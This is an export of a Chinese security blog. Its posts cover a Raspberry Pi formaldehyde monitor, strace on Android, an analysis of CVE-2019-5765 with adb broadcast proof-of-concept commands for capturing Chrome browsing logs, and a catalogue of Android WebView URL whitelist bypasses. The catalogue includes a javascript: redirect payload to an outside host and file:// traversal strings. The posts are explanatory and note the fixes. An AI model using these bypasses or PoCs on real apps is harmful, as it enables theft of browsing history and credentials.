successful"></p><p>ze08接树莓派：</p><table><thead><tr><th>ZE08</th><th>RpiGPIO</th></tr></thead><tbody><tr><td>Pin4(5V)</td><td>Pin2(5V)</td></tr><tr><td>Pin3(GND)</td><td>Pin6(GND)</td></tr><tr><td>Pin6(UART-TxD)</td><td>Pin10(UART-RxD)</td></tr></tbody></table><p>三、 ssd1306 引脚</p><p><img src="/images/pasted-208.png" alt="upload successful"></p><p>ssd1306接树莓派（IIC协议）：</p><table><thead><tr><th>OLED</th><th>RpiGPIO</th></tr></thead><tbody><tr><td>VCC</td><td>Pin1(3.3V)</td></tr><tr><td>SDA</td><td>Pin3(SDA)</td></tr><tr><td>SCL</td><td>Pin5(SCL)</td></tr><tr><td>GND</td><td>Pin9(GND）</td></tr></tbody></table><h3 id="3-代码"><a href="#3-代码" class="headerlink" title="3.代码"></a>3.代码</h3><p>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import serial</span><br><span class="line">import time</span><br><span class="line">from time import sleep</span><br><span class="line">import Adafruit_SSD1306</span><br><span class="line">from PIL import Image</span><br><span class="line">from PIL import ImageDraw</span><br><span class="line">from PIL import ImageFont</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ser=serial.Serial(&quot;/dev/serial0&quot;,9600)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#init display</span><br><span class="line">disp = Adafruit_SSD1306.SSD1306_128_64(rst=None)</span><br><span class="line">disp.begin()</span><br><span class="line">disp.clear()</span><br><span class="line">disp.display()</span><br><span class="line"></span><br><span class="line">width = disp.width</span><br><span class="line">height = disp.height</span><br><span class="line">image = Image.new(&apos;1&apos;, (width, height))</span><br><span class="line">draw = ImageDraw.Draw(image)</span><br><span class="line">draw.rectangle((0,0,width,height), outline=0, fill=0)</span><br><span class="line"></span><br><span class="line">padding = 2</span><br><span class="line">top = padding</span><br><span class="line">bottom = height-padding</span><br><span class="line">x = 0</span><br><span class="line">font = ImageFont.load_default()</span><br><span class="line">font = ImageFont.truetype(&quot;/usr/share/fonts/truetype/freefont/FreeSans.ttf&quot;,15)</span><br><span class="line">cmd = &quot;hostname -I | cut -d\&apos; \&apos; -f1&quot;</span><br><span class="line">IP = subprocess.check_output(cmd, shell = True )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def save(data):</span><br><span class="line">    today = time.strftime(&quot;%Y-%m-%d&quot;, time.localtime())</span><br><span class="line">    f = open(today,&apos;a&apos;)</span><br><span class="line">    f.write(data)</span><br><span class="line">    f.write(&quot;\n&quot;)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True :</span><br><span class="line">    r_data = ser.read()</span><br><span class="line">    sleep(0.3)</span><br><span class="line">    data_left = ser.inWaiting()</span><br><span class="line">    r_data += ser.read(data_left)</span><br><span class="line">    if 9 != len(r_data):</span><br><span class="line">        print &apos;error length: %d&apos;%len(r_data)</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        n=ord(r_data[4])*256+ord(r_data[5])</span><br><span class="line">        ppm = str(n/1000.0)</span><br><span class="line">        #print(&quot;CH2O:&quot;+ppm) # ppm = n/1000.0</span><br><span class="line">        save(ppm)</span><br><span class="line">        draw.rectangle((0,0,width,height), outline=0, fill=0)</span><br><span class="line">        draw.text((x, top),       &quot;IP: &quot; + str(IP),  font=font, fill=255)</span><br><span class="line">        draw.text((x, top+15),     str(time.strftime(&quot;%Y%m%d %H:%M:%S&quot;, time.localtime())), font=font, fill=255)</span><br><span class="line">        draw.text((x, top+35),    str(&quot;CH2O: &quot;+ppm),  font=font, fill=255)</span><br><span class="line">        disp.image(image)</span><br><span class="line">        disp.display()</span><br></pre></td></tr></table></figure></p><p>利用crontab实现监控<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">v_num=`ps -ef|grep &quot;read.py&quot;|grep -v grep |wc -l`</span><br><span class="line">if [ $v_num -lt 1 ]</span><br><span class="line">then</span><br><span class="line">date</span><br><span class="line">echo &quot;read process die&quot;</span><br><span class="line">ps -ef|grep &quot;read.py&quot;|grep -v grep |awk &apos;&#123; print $2 &#125;&apos;|xargs kill -9</span><br><span class="line">cd /home/pi/m4bln</span><br><span class="line">python read.py &amp;</span><br><span class="line">sleep 20</span><br><span class="line">v_num=`ps -ef|grep &quot;read.py&quot;|grep -v grep |wc -l`</span><br><span class="line">if [ $v_num -eq 1 ]</span><br><span class="line">then</span><br><span class="line">date</span><br><span class="line">echo &quot;reopen read process&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">date</span><br><span class="line">echo &quot;everything is OK :)&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p><p>参考资料：</p><ol><li>树莓派串口配置 <a href="https://www.abelectronics.co.uk/kb/article/1035/raspberry-pi-3--4-and-zero-w-serial-port-usage" target="_blank" rel="noopener">https://www.abelectronics.co.uk/kb/article/1035/raspberry-pi-3--4-and-zero-w-serial-port-usage</a></li><li><a href="https://www.raspberrypi.org/documentation/configuration/uart.md" target="_blank" rel="noopener">https://www.raspberrypi.org/documentation/configuration/uart.md</a></li><li>ZE08-CH2O模组文档 <a href="http://style.winsensor.com/pro_pdf/ZE08-CH2O.pdf" target="_blank" rel="noopener">http://style.winsensor.com/pro_pdf/ZE08-CH2O.pdf</a></li><li><a href="http://shumeipai.nxez.com/2017/09/13/raspberry-pi-network-configuration-before-boot.html" target="_blank" rel="noopener">http://shumeipai.nxez.com/2017/09/13/raspberry-pi-network-configuration-before-boot.html</a> 无屏幕和键盘配置树莓派WiFi和SSH</li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Android上利用strace跟踪系统调用</title>
      <link href="/2019/06/27/Android%E4%B8%8A%E5%88%A9%E7%94%A8Strace%E8%B7%9F%E8%B8%AA%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
      <url>/2019/06/27/Android%E4%B8%8A%E5%88%A9%E7%94%A8Strace%E8%B7%9F%E8%B8%AA%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>strace 是linux下的调试利器,它被用来跟踪所有的系统调用，打印系统调用的参数和返回值，Android 也支持strace。</p><h2 id="安装strace"><a href="#安装strace" class="headerlink" title="安装strace"></a>安装strace</h2><p>Android系统并没有自带strace的binary，需要自己编译移植到Android设备中,在Android源码下仅编译strace模块即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mmma -j6 external/strace</span><br></pre></td></tr></table></figure></p><p>如果不想配环境自己编译，去其他地方下载静态链接的strace binary也可以，但安全性需要自己把握，例如<a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/arm/strace。" target="_blank" rel="noopener">https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/arm/strace。</a></p><p>得到binary后，push到/data/local/tmp下更改权限，关闭SELinux后即可使用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">adb push strace /data/local/tmp/</span><br><span class="line">adb shell</span><br><span class="line">android:/ $ chmod 777 /data/local/tmp/strace</span><br><span class="line">su</span><br><span class="line">android:/ # setenforce 0</span><br></pre></td></tr></table></figure></p><h2 id="使用strace"><a href="#使用strace" class="headerlink" title="使用strace"></a>使用strace</h2><h3 id="1-attach到正在运行的进程"><a href="#1-attach到正在运行的进程" class="headerlink" title="1.attach到正在运行的进程"></a>1.attach到正在运行的进程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -f -p PID -o strace_log.txt</span><br></pre></td></tr></table></figure><p>-f表示跟踪所有子进程，包括新起的进程。<br>由于strace会打出大量的日志，所有需要进一步从日志筛选出想要的内容。</p><h3 id="2-在应用启动前strace"><a href="#2-在应用启动前strace" class="headerlink" title="2.在应用启动前strace"></a>2.在应用启动前strace</h3><p>试过Android官方文档中的setprop的方法，不起作用，这里采用另一种方式。主要原理是设置应用启动后等待调试，然后运行strace，再调试应用即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">am set-debug-app -w com.package.name</span><br><span class="line">am start com.package.name/com.path.to.MainActivity // 或者手动打开app</span><br><span class="line">ps -A | grep com.package.name</span><br><span class="line">strace -p &lt;PID&gt;</span><br><span class="line">用AndroidStudio等工具调试即可</span><br></pre></td></tr></table></figure></p><h3 id="其他用法"><a href="#其他用法" class="headerlink" title="其他用法"></a>其他用法</h3><ul><li><p>跟踪指定类型的系统调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-e trace=file     跟踪和文件访问相关的调用(参数中有文件名)</span><br><span class="line">-e trace=process  和进程管理相关的调用，比如fork/exec/exit_group</span><br><span class="line">-e trace=network  和网络通信相关的调用，比如socket/sendto/connect</span><br><span class="line">-e trace=signal    信号发送和处理相关，比如kill/sigaction</span><br><span class="line">-e trace=desc  和文件描述符相关，比如write/read/select/epoll等</span><br><span class="line">-e trace=ipc 进程见通讯相关，比如shmget等</span><br></pre></td></tr></table></figure></li><li><p>参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-tt 在每行输出的前面，显示毫秒级别的时间</span><br><span class="line">-T 显示每次系统调用所花费的时间</span><br><span class="line">-v 对于某些相关调用，把完整的环境变量，文件stat结构等打出来。</span><br></pre></td></tr></table></figure></li></ul><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><ul><li>1.跟踪文件操作<br>  热补丁、运行时解密的文件</li><li>2.性能分析<br>  打印系统调用时间</li></ul><p>参考：</p><ol><li><a href="https://source.android.com/devices/tech/debug/strace" target="_blank" rel="noopener">https://source.android.com/devices/tech/debug/strace</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>to do list</title>
      <link href="/2019/06/17/o-do-list/"/>
      <url>/2019/06/17/o-do-list/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>CVE-2019-5765分析</title>
      <link href="/2019/05/21/CVE-2019-5765%E5%88%86%E6%9E%90/"/>
      <url>/2019/05/21/CVE-2019-5765%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h4 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h4><p>CVE-2019-5765的原理比较简单。Chrome Android客户端注册了一个broadcast receiver, 当接收到(app_package)_GPU_PROFILER_START广播后，会开启trace, 并将所有的url请求和header(不包含cookie)保存在文件中。</p><p>然而，这个receiver未做好权限控制，导致任意第三方应用都可以发送该广播开启chrome的trace,而且还可以指定trace log的保存路径，恶意应用通过读取trace log文件可以窃取用户所有的浏览记录。</p><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>该漏洞影响所有chrome内核版本小于72.0.3626.81的浏览器，例如webview、第三方浏览器等等。</p><p>通常，该漏洞的利用需要攻击者在用户手机上安装一个恶意apk，通过发送广播可以获取目标浏览器或webview上所有的浏览记录，以及用户的登录凭据（例如Oauth token, header里的敏感token）等。</p><h4 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h4><ol><li><p>发送广播开启trace</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast -a com.android.chrome.GPU_PROFILER_START</span><br></pre></td></tr></table></figure></li><li><p>在目标浏览器中打开一个页面</p></li><li>发送广播关闭trace<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast -a com.android.chrome.GPU_PROFILER_STOP</span><br></pre></td></tr></table></figure></li></ol><p>trace log默认保存在/sdcard/Download/目录下，例如”/sdcard/Download/chrome-profile-results-2019-05-24-084507“，使用adb shell am broadcast -a com.android.chrome.GPU_PROFILER_START -e file mypath可以指定保存路径。</p><h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>修复方式为”只有debug版本的系统才会注册该receiver“</p><p><img src="/images/pasted-185.png" alt="upload successful"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li><p>Android 7.0之后，系统webview使用Chrome的引擎，因此更新Chrome即可修复漏洞。在安装Play Store的系统上，Chrome和系统内置webview会自动更新到最新版本。Android 7.0之前的系统需要更新系统内置的webview</p></li><li><p>未安装Play Store的AOSP系统（三星、华为、小米、oppo、vivo等）需要厂商来更新，因此多数第三方ROM手机或定制webview浏览器厂商受该漏洞影响。</p></li><li><p>部分定制化的浏览器对chrome内核进行了修改，因此也有可能不存在这个漏洞</p></li></ul><p>参考资料：</p><ol><li>chrome issue <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=922627" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=922627</a></li><li>chrome fix log <a href="https://chromium.googlesource.com/chromium/src.git/+/318a79045ace18d73e1115d086599e036d0496ba%5E%21/#F0" target="_blank" rel="noopener">https://chromium.googlesource.com/chromium/src.git/+/318a79045ace18d73e1115d086599e036d0496ba%5E%21/#F0</a></li><li><a href="https://hackerone.com/reports/563870" target="_blank" rel="noopener">https://hackerone.com/reports/563870</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Android WebView URL检查绕过</title>
      <link href="/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/"/>
      <url>/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="URL结构"><a href="#URL结构" class="headerlink" title="URL结构"></a>URL结构</h2><p>scheme://login:password@address:port/path/to/resource/?query_string#fragment</p><ul><li>scheme<br>不区分大小写，包括http、https、file、ftp等等,:之后的“//”可省略，例如http:www.qq.com, 此外，多数浏览器在scheme之前加空格也是可以正常解析的</li><li>login:password@（认证信息）<br>服务器有时候需要用户名和密码认证，ftp协议比较常见，http很少见，但这个不常见字段往往可以绕过很多检查</li><li>address<br>address字段可以是一个不区分大小写的域名、一个ipv4地址或带方括号的ipv6地址，部分浏览器接收ip地址的八进制、十进制、十六进制等写法</li><li>port<br>端口号</li><li>/path/to/resource<br>层级路径，可以使用“../”到上一级目录</li><li>query_string<br>查询字符串，格式为”query_string?name1=value1&amp;name2=value2”</li><li>fragment<br>用于html中的页面定位</li></ul><h2 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h2><p>白名单绕过主要参考rebeyond的文章 <a href="https://www.freebuf.com/articles/terminal/201407.html" target="_blank" rel="noopener">一文彻底搞懂安卓WebView白名单校验</a>, 中间添加了一些自己的绕过方法。</p><h3 id="1-contains"><a href="#1-contains" class="headerlink" title="1.contains"></a>1.contains</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">private static boolean checkDomain(String inputUrl)</span><br><span class="line">&#123;</span><br><span class="line">    String[] whiteList=new String[]&#123;&quot;huawei.com&quot;,&quot;hicloud.com&quot;&#125;;</span><br><span class="line">    for (String whiteDomain:whiteList)</span><br><span class="line">    &#123;</span><br><span class="line">        if (inputUrl.contains(whiteDomain)&gt;0)</span><br><span class="line">            return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return  false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过方式：<br>任何可以添加字符串的字段</p><ul><li>子域名 huawei.com.mysite.com</li><li>子路径 mysite.com/huawei.com</li><li>参数 mysite.com/xxxx#huawei.com</li></ul><h3 id="2-indexOf"><a href="#2-indexOf" class="headerlink" title="2.indexOf"></a>2.indexOf</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">private static boolean checkDomain(String inputUrl)</span><br><span class="line">&#123;</span><br><span class="line">    String[] whiteList=new String[]&#123;&quot;huawei.com&quot;,&quot;hicloud.com&quot;&#125;;</span><br><span class="line">    for (String whiteDomain:whiteList)</span><br><span class="line">    &#123;</span><br><span class="line">        if (inputUrl.indexOf(whiteDomain)&gt;0)</span><br><span class="line">            return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return  false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过方式：<br>和contains相同</p><h3 id="3-startsWith、endsWith"><a href="#3-startsWith、endsWith" class="headerlink" title="3.startsWith、endsWith"></a>3.startsWith、endsWith</h3><p>一般白名单会有子域名，因此不用equal</p><p>绕过方式：</p><ul><li>startsWith  huawei.com.mysite.com</li><li>endsWith  mysitehuawei.com</li></ul><h3 id="4-和第一个-之间提取host"><a href="#4-和第一个-之间提取host" class="headerlink" title="4.://和第一个/之间提取host"></a>4.://和第一个/之间提取host</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">private static boolean checkDomain(String inputUrl)</span><br><span class="line">&#123;</span><br><span class="line">    String[] whiteList=new String[]&#123;&quot;huawei.com&quot;,&quot;hicloud.com&quot;&#125;;</span><br><span class="line">    String tempStr=inputUrl.replace(&quot;://&quot;,&quot;&quot;);</span><br><span class="line">    String inputDomain=tempStr.substring(0,tempStr.indexOf(&quot;/&quot;)); //提取host</span><br><span class="line">    for (String whiteDomain:whiteList)</span><br><span class="line">    &#123;</span><br><span class="line">        if (inputDomain.indexOf(whiteDomain)&gt;0)</span><br><span class="line">            return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return  false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过方式：</p><ul><li>子域名 huawei.com.mysite.com</li><li><a href="http://huawei.com@www.rebeyond.net/poc.htm" target="_blank" rel="noopener">http://huawei.com@www.rebeyond.net/poc.htm</a></li><li><a href="http://a:a@www.huawei.com:b@www.baidu.com" target="_blank" rel="noopener">http://a:a@www.huawei.com:b@www.baidu.com</a> 在android中使用getHost获取到的是huawei.com,但实际访问的是baidu.com</li></ul><h3 id="5-使用java-net-URL提取host"><a href="#5-使用java-net-URL提取host" class="headerlink" title="5.使用java.net.URL提取host"></a>5.使用java.net.URL提取host</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">private static boolean checkDomain(String inputUrl) throws MalformedURLException &#123;</span><br><span class="line">    String[] whiteList=new String[]&#123;&quot;huawei.com&quot;,&quot;hicloud.com&quot;&#125;;</span><br><span class="line">    java.net.URL url=new java.net.URL(inputUrl);</span><br><span class="line">    String host=url.getHost(); //提取host</span><br><span class="line">    for (String whiteDomain:whiteList)</span><br><span class="line">    &#123;</span><br><span class="line">        if (host.equals(whiteDomain)) return true;</span><br><span class="line">                    </span><br><span class="line">    &#125;</span><br><span class="line">    return  false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过方式：</p><ul><li><a href="http://a:a@www.huawei.com:b@www.baidu.com" target="_blank" rel="noopener">http://a:a@www.huawei.com:b@www.baidu.com</a> 在android中使用getHost获取到的是huawei.com,但实际访问的是baidu.com</li><li><a href="https://www.mysite.com\@www.huawei.com/poc.htm上述URL通过java.net.URL的getHost方法得到的host是www.huawei.com，但实际上访问的确是www.mysite.com" target="_blank" rel="noopener">https://www.mysite.com\@www.huawei.com/poc.htm上述URL通过java.net.URL的getHost方法得到的host是www.huawei.com，但实际上访问的确是www.mysite.com</a></li><li><a href="https://www.mysite.com\\.huawei.com经过java.net.URL的getHost方法提取得到的是www.mysite.com.huawei.com，可以绕过白名单域名的endsWith匹配，但是实际访问的确是www.mysite.com服务器(新版已修复" target="_blank" rel="noopener">https://www.mysite.com\\.huawei.com经过java.net.URL的getHost方法提取得到的是www.mysite.com.huawei.com，可以绕过白名单域名的endsWith匹配，但是实际访问的确是www.mysite.com服务器(新版已修复</a>)</li></ul><h3 id="6-java-net-URI"><a href="#6-java-net-URI" class="headerlink" title="6.java.net.URI"></a>6.java.net.URI</h3><p>java.net.URI能获取到正常的host,但是可以利用JavaScript协议绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rivate static boolean checkDomain(String inputUrl) throws  URISyntaxException &#123;</span><br><span class="line">    String[] whiteList=new String[]&#123;&quot;huawei.com&quot;,&quot;hicloud.com&quot;&#125;;</span><br><span class="line">    java.net.URI url=new java.net.URI(inputUrl);</span><br><span class="line">    String inputDomain=url.getHost(); //提取host</span><br><span class="line">    for (String whiteDomain:whiteList)</span><br><span class="line">    &#123;</span><br><span class="line">        if (inputDomain.endsWith(&quot;.&quot;+whiteDomain)) //www.huawei.com      app.hicloud.com</span><br><span class="line">            return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return  false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>绕过方式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript://www.huawei.com/%0d%0awindow.location.href=‘http://www.rebeyond.net/poc.htm‘</span><br></pre></td></tr></table></figure></p><p>相当于执行了一行js代码，第一行通过//符号来骗过java.net.URI获取到值为www.huawei.com的host，恰好//符号在Javascript的世界里是行注释符号，所以第一行实际并没有执行；然后通过%0d%0a换行，继续执行window.location.href=’<a href="http://www.rebeyond.net/poc.htm’" target="_blank" rel="noopener">http://www.rebeyond.net/poc.htm’</a></p><h3 id="7-排除javascript协议"><a href="#7-排除javascript协议" class="headerlink" title="7.排除javascript协议"></a>7.排除javascript协议</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">private static boolean checkDomain(String inputUrl) throws  URISyntaxException &#123;</span><br><span class="line">    if (!inputUrl.startsWith(&quot;http://&quot;)&amp;&amp;!inputUrl.startsWith(&quot;https://&quot;))</span><br><span class="line">    &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    String[] whiteList=new String[]&#123;&quot;huawei.com&quot;,&quot;hicloud.com&quot;&#125;;</span><br><span class="line">    java.net.URI url=new java.net.URI(inputUrl);</span><br><span class="line">    String inputDomain=url.getHost(); //提取host</span><br><span class="line">    for (String whiteDomain:whiteList)</span><br><span class="line">    &#123;</span><br><span class="line">        if (inputDomain.endsWith(&quot;.&quot;+whiteDomain)) //www.huawei.com      app.hicloud.com</span><br><span class="line">            return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return  false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过方式：<br>配合url重定向漏洞，例如<a href="https://www.huawei.com/redirect.php?url=http://mysite.com" target="_blank" rel="noopener">https://www.huawei.com/redirect.php?url=http://mysite.com</a></p><p>防御办法：<br>Webview在请求<a href="https://www.huawei.com/redirect.php?url=http://mysite.com的时候，实际是发出了两次请求，第一次是在loadUrl中请求，第二次是请求http://mysite.com，但是第二次请求发生在loadUrl之后，而我们的白名单校验逻辑在loadUrl之前，才导致了绕过。通过在webview的shouldOverrideUrlLoading方法中检测，拦截跳转。" target="_blank" rel="noopener">https://www.huawei.com/redirect.php?url=http://mysite.com的时候，实际是发出了两次请求，第一次是在loadUrl中请求，第二次是请求http://mysite.com，但是第二次请求发生在loadUrl之后，而我们的白名单校验逻辑在loadUrl之前，才导致了绕过。通过在webview的shouldOverrideUrlLoading方法中检测，拦截跳转。</a></p><h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><p>有些app会在URL中指定黑名单，例如竞品域名等，这里简单罗列一些思路：</p><ul><li>使用大小写绕过contains，例如HTTP://MySITe.com</li><li>使用特殊编码</li><li>待补充</li></ul><h2 id="file协议绕过"><a href="#file协议绕过" class="headerlink" title="file协议绕过"></a>file协议绕过</h2><p>APP经常会使用file://协议加载本地文件，通常会限制在一些特定路径中，这里记录一下之前的经验：</p><ul><li>不要用url.startWith(”file://”)来判断是否为file协议，因为“FILE://”(大小)、“File://”(大小写)、“ file://”(前边加空格)、“file:”等方式都可以绕过检测。url.contains(“file://”)更不靠谱，推荐使用getScheme()来判断协议；</li><li>file:///android_asset和file:///android_res 也可以../穿越</li><li>白名单判断了“../，但通过“..\”也是可以穿越的，例如file:///sdcard/..\../sdcard/1.html</li><li>getHost有漏洞（file://a:a@www.qq.com:b@www.baidu.com使用getHost获取到的是qq.com,但实际访问的是baidu.com)</li><li>file://baidu.com/data/data/tmp 前边的baidu.com是可以不被解析的<br>协议头不包括///，还是仍然能够正常loadUrl，如file:mnt/sdcard/filedomain.html</li><li>白名单判断了“../”，但通过url编码绕过，例如file:///data/data/com.app/%2e%2e/%2e%2e/%2e%2e/sdcard/xxx </li><li>replace(“../“,””)可以使用”….//“绕过</li></ul><p>参考资料：</p><ol><li><a href="https://www.freebuf.com/articles/terminal/201407.html" target="_blank" rel="noopener">一文彻底搞懂安卓WebView白名单校验</a> </li><li><p><a href="https://android.googlesource.com/platform/frameworks/base/+/4afa0352d6c1046f9e9b67fbf0011bcd751fcbb5" target="_blank" rel="noopener">https://android.googlesource.com/platform/frameworks/base/+/4afa0352d6c1046f9e9b67fbf0011bcd751fcbb5</a></p></li><li><p><a href="https://android.googlesource.com/platform/frameworks/base/+/0b57631939f5824afef06517df723d2e766e0159" target="_blank" rel="noopener">https://android.googlesource.com/platform/frameworks/base/+/0b57631939f5824afef06517df723d2e766e0159</a></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Android Download Provider 3个漏洞分析</title>
